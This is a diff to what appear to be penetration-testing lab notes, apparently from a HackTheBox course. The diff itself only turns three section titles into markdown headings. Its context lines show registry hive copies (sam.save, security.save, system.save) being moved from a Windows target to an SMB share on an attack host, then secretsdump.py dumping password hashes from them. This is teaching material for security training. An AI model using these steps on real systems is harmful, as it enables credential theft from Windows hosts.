@@ -2320,7 +2320,8 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 ```
 
 Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.
-Moving Hive Copies to Share
+
+  ## Moving Hive Copies to Share
 ```
 C:\> move sam.save \\<ip>\<share name>
         1 file(s) moved.
@@ -2341,7 +2342,7 @@ Suljov@htb[/htb]$ ls
 sam.save  security.save  system.save
 ```
 
-Dumping Hashes with Impacket's secretsdump py
+## Dumping Hashes with Impackets secretsdump py
 
 One incredibly useful tool we can use to dump the hashes offline is Impacket's secretsdump.py. Impacket can be found on most modern penetration testing distributions. We can check for it by using locate on a Linux-based system:
 ```
@@ -2350,7 +2351,7 @@ Suljov@htb[/htb]$ locate secretsdump
 
 Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.
   
-Running secretsdump py
+## Running secretsdump py
 
 ```
 Suljov@htb[/htb]$ sudo secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
